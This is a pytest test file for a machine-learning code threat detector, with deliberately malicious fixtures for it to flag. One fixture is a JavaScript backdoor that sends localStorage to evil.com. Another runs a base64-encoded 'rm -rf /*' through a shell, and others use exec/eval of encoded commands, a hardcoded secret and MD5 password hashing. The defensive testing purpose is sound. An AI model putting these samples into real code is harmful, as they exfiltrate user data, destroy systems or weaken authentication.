"""Tests for ML threat detection engine."""

import pytest
import numpy as np
from datetime import datetime
from unittest.mock import Mock, patch

from compliance_sentinel.analyzers.ml_threat_detector import (
    MLThreatDetectionEngine, CodeFeatureExtractor, AnomalyDetectionModel,
    ThreatType, AnomalyType, CodeFeatures, AnomalyReport
)
from compliance_sentinel.analyzers.languages.base import ProgrammingLanguage
from compliance_sentinel.core.interfaces import SecurityIssue, Severity, SecurityCategory


class TestCodeFeatureExtractor:
    """Test cases for code feature extraction."""
    
    def setup_method(self):
        """Set up test fixtures."""
        self.extractor = CodeFeatureExtractor()
        
        self.test_codes = {
            "simple_python": '''
def hello_world():
    print("Hello, World!")
    return True
''',
            "complex_python": '''
import os
import hashlib
from cryptography.fernet import Fernet

class UserManager:
    def __init__(self):
        self.users = {}
        self.secret_key = "hardcoded_secret_123"
    
    def authenticate(self, username, password):
        if username in self.users:
            stored_hash = self.users[username]
            password_hash = hashlib.md5(password.encode()).hexdigest()
            return password_hash == stored_hash
        return False
    
    def create_user(self, username, password):
        for i in range(10):
            if i % 2 == 0:
                for j in range(5):
                    if j % 2 == 0:
                        print(f"Processing {i}-{j}")
        
        password_hash = hashlib.md5(password.encode()).hexdigest()
        self.users[username] = password_hash
        return True
''',
            "obfuscated_code": '''
import base64
exec(base64.b64decode("cHJpbnQoJ0hlbGxvLCBXb3JsZCEn)"))
eval("__import__('os').system('ls')")
_0x1a2b3c = "\\x48\\x65\\x6c\\x6c\\x6f"
''',
            "suspicious_javascript": '''
function backdoor() {
    if (document.cookie.includes("admin_token_12345")) {
        eval(atob("Y29uc29sZS5sb2coJ0JhY2tkb29yIGFjdGl2YXRlZCcp"));
        fetch("http://evil.com/exfiltrate", {
            method: "POST",
            body: JSON.stringify(localStorage)
        });
    }
}
'''
        }
    
    def test_basic_feature_extraction(self):
        """Test basic feature extraction from simple code."""
        features = self.extractor.extract_features(
            self.test_codes["simple_python"],
            ProgrammingLanguage.PYTHON
        )
        
        assert isinstance(features, CodeFeatures)
        assert features.lines_of_code > 0
        assert features.function_count >= 1
        assert features.language == "python"
        assert features.entropy > 0
    
    def test_complexity_calculation(self):
        """Test cyclomatic complexity calculation."""
        features = self.extractor.extract_features(
            self.test_codes["complex_python"],
            ProgrammingLanguage.PYTHON
        )
        
        # Complex code should have higher complexity
        assert features.cyclomatic_complexity > 5
        assert features.nesting_depth > 2
        assert features.function_count >= 2
        assert features.class_count >= 1
    
    def test_entropy_calculation(self):
        """Test entropy calculation for obfuscated code."""
        features = self.extractor.extract_features(
            self.test_codes["obfuscated_code"],
            ProgrammingLanguage.PYTHON
        )
        
        # Obfuscated code should have high entropy and obfuscation score
        assert features.entropy > 4.0
        assert features.obfuscation_score > 0.3
        assert features.base64_strings > 0
        assert features.eval_calls > 0
        assert features.exec_calls > 0
    
    def test_suspicious_pattern_detection(self):
        """Test detection of suspicious patterns."""
        features = self.extractor.extract_features(
            self.test_codes["suspicious_javascript"],
            ProgrammingLanguage.JAVASCRIPT
        )
        
        # Should detect network operations and base64 strings
        assert features.network_operations > 0
        assert features.base64_strings > 0
        assert features.obfuscation_score > 0.2
    
    def test_feature_vector_conversion(self):
        """Test conversion of features to numpy vector."""
        features = self.extractor.extract_features(
            self.test_codes["simple_python"],
            ProgrammingLanguage.PYTHON
        )
        
        vector = features.to_vector()
        
        assert isinstance(vector, np.ndarray)
        assert len(vector) == 19  # Expected number of features
        assert vector.dtype == np.float32
        assert not np.isnan(vector).any()  # No NaN values


class TestAnomalyDetectionModel:
    """Test cases for anomaly detection model."""
    
    def setup_method(self):
        """Set up test fixtures."""
        self.model = AnomalyDetectionModel()
        
        # Create training data
        self.training_features = [
            CodeFeatures(
                lines_of_code=50, cyclomatic_complexity=5.0, nesting_depth=3,
                function_count=5, class_count=1, entropy=4.5, string_entropy=3.0,
                comment_ratio=0.2, identifier_entropy=4.0, import_count=3,
                external_calls=10, file_operations=2, network_operations=1,
                crypto_operations=0, obfuscation_score=0.1, base64_strings=0,
                hex_strings=0, eval_calls=0, exec_calls=0, language="python",
                framework_indicators=[]
            ),
            CodeFeatures(
                lines_of_code=30, cyclomatic_complexity=3.0, nesting_depth=2,
                function_count=3, class_count=0, entropy=4.0, string_entropy=2.5,
                comment_ratio=0.3, identifier_entropy=3.5, import_count=2,
                external_calls=5, file_operations=1, network_operations=0,
                crypto_operations=1, obfuscation_score=0.05, base64_strings=0,
                hex_strings=0, eval_calls=0, exec_calls=0, language="python",
                framework_indicators=[]
            )
        ]
    
    def test_model_training(self):
        """Test model training with baseline data."""
        self.model.train(self.training_features)
        
        assert self.model.trained is True
        assert "mean" in self.model.baseline_stats
        assert "std" in self.model.baseline_stats
        assert len(self.model.baseline_stats["mean"]) == 19  # Number of features
    
    def test_anomaly_detection_normal_code(self):
        """Test anomaly detection on normal code."""
        self.model.train(self.training_features)
        
        # Normal code features (similar to training data)
        normal_features = CodeFeatures(
            lines_of_code=45, cyclomatic_complexity=4.5, nesting_depth=3,
            function_count=4, class_count=1, entropy=4.2, string_entropy=2.8,
            comment_ratio=0.25, identifier_entropy=3.8, import_count=3,
            external_calls=8, file_operations=2, network_operations=1,
            crypto_operations=0, obfuscation_score=0.08, base64_strings=0,
            hex_strings=0, eval_calls=0, exec_calls=0, language="python",
            framework_indicators=[]
        )
        
        anomaly_score = self.model.detect_anomaly(normal_features)
        
        # Normal code should have low anomaly score
        assert anomaly_score < 0.5


class TestMLThreatDetectionEngine:
    """Test cases for ML threat detection engine."""
    
    def setup_method(self):
        """Set up test fixtures."""
        self.engine = MLThreatDetectionEngine()
        
        self.test_codes = {
            "normal_code": '''
def calculate_sum(numbers):
    """Calculate sum of numbers."""
    total = 0
    for num in numbers:
        total += num
    return total
''',
            "malware_like": '''
import base64
import subprocess
import os

def backdoor():
    cmd = base64.b64decode("cm0gLXJmIC8q")
    subprocess.call(cmd, shell=True)
    
exec(base64.b64decode("X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk="))
'''
        }
    
    def test_engine_initialization(self):
        """Test engine initialization."""
        assert self.engine.feature_extractor is not None
        assert self.engine.anomaly_model is not None
        assert isinstance(self.engine.threat_patterns, dict)
    
    def test_normal_code_analysis(self):
        """Test analysis of normal code."""
        report = self.engine.analyze_code(
            self.test_codes["normal_code"],
            "normal.py",
            ProgrammingLanguage.PYTHON
        )
        
        assert isinstance(report, AnomalyReport)
        assert report.anomaly_score < 0.3  # Should be low for normal code
        assert report.anomaly_type in [AnomalyType.NONE, AnomalyType.LOW]
        assert len(report.threat_indicators) == 0


if __name__ == "__main__":
    pytest.main([__file__])